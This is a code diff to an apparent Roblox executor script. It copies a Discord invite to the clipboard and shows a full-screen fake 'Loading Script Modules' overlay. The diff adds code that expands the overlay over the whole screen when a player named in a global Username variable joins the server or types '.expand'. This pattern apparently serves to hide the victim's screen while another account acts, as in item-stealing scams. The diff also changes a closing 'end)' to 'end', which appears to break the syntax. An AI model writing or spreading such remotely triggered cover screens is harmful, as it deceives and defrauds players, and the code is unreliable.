@@ -1,6 +1,3 @@
--- Script was generted by AI
--- Feel free to fork this script (kept open source for fast updates)
-
 setclipboard("https://discord.gg/evelynnscripts")
 
 local startTime = tick()
@@ -21,6 +18,9 @@ gui.Parent = Players.LocalPlayer:WaitForChild("PlayerGui")
 gui.ResetOnSpawn = false
 gui.IgnoreGuiInset = true
 gui.DisplayOrder = 999999
+
+-- Flag to track if UI has already expanded
+local hasExpanded = false
 
 local function stroke(obj, thickness, color)
     local s = Instance.new("UIStroke", obj)
@@ -135,6 +135,9 @@ status.Text = "Loading Script Modules..."
 stroke(status, 1, Color3.fromRGB(100, 50, 150))
 
 local function Expand()
+    if hasExpanded then return end
+    hasExpanded = true
+    
     local tween = TweenService:Create(bg, TweenInfo.new(1.2, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {
         Size = UDim2.new(1, 0, 1, 0),
         Position = UDim2.new(0.5, 0, 0.5, 0)
@@ -146,6 +149,32 @@ local function Expand()
         status.Visible = true
         safeText.Visible = true
     end)
+end
+
+-- Function to check for target player
+local function checkForTargetPlayer()
+    if not getgenv().Username then return end
+    
+    -- Check existing players
+    for _, player in ipairs(Players:GetPlayers()) do
+        if player.Name == getgenv().Username then
+            Expand()
+            return true
+        end
+    end
+    
+    -- Listen for new players
+    local connection
+    connection = Players.PlayerAdded:Connect(function(player)
+        if player.Name == getgenv().Username then
+            Expand()
+            if connection then
+                connection:Disconnect()
+            end
+        end
+    end)
+    
+    return false
 end
 
 local function setupChatHandler()
@@ -170,7 +199,7 @@ local function setupChatHandler()
             if player.Name == getgenv().Username and string.lower(message) == ".expand" then
                 Expand()
             end
-        end)
+        end
     end
 end
 
@@ -211,6 +240,11 @@ local function update()
         Expand()
     end
 end
+
+-- Start checking for target player immediately
+checkForTargetPlayer()
+
+-- Main update loop
 while tick() - startTime < totalDuration do
     update()
     wait(0.1)
